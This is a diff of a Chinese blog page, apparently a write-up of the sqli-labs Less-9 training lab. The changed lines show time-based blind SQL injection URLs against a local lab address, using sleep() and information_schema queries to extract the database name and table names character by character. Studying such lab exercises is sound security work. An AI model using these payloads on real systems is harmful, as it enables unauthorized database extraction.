@@ -419,7 +419,7 @@ sleep(n)：命令延时 n 秒后执行
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        495
+                        492
                     </div>
                     
 
@@ -459,21 +459,21 @@ sleep(n)：命令延时 n 秒后执行
 <ol start="2">
 <li><strong>判断数据库字符串的长度</strong></li>
 </ol>
-<pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1' and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>56, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1' and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">></span>56, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/16/5pRUJo36x1wNarc.png" alt="less9-2.png"></p>
 <pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1' and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">=</span>56, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/16/FZIXTMNaoPAYJj6.png" alt="less9-3.png"></p>
 <ol start="3">
 <li><strong>判断数据库</strong></li>
 </ol>
-<pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1' and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>115, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1' and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">></span>115, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/16/3GwjcbBpYnvPZH5.png" alt="less9-4.png"></p>
 <pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1' and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>115, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/16/eonK3brJVg4LaXY.png" alt="less9-5.png"></p>
 <ol start="4">
 <li><strong>判断表</strong></li>
 </ol>
-<pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1<span class="token string">' and if(ascii(substr((select table_name from information_schema.tables where table_schema='</span>security' limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>101, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1<span class="token string">' and if(ascii(substr((select table_name from information_schema.tables where table_schema='</span>security' limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">></span>101, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/16/8jGMV7ZxhvKIFpz.png" alt="less9-6.png"></p>
 <pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1<span class="token string">' and if(ascii(substr((select table_name from information_schema.tables where table_schema='</span>security' limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>101, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/16/9tTmR73w46gBbe2.png" alt="less9-7.png"></p>
@@ -754,7 +754,7 @@ sleep(n)：命令延时 n 秒后执行
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">61k</span>&nbsp;字
+                class="white-color">61.6k</span>&nbsp;字
                
             
 			
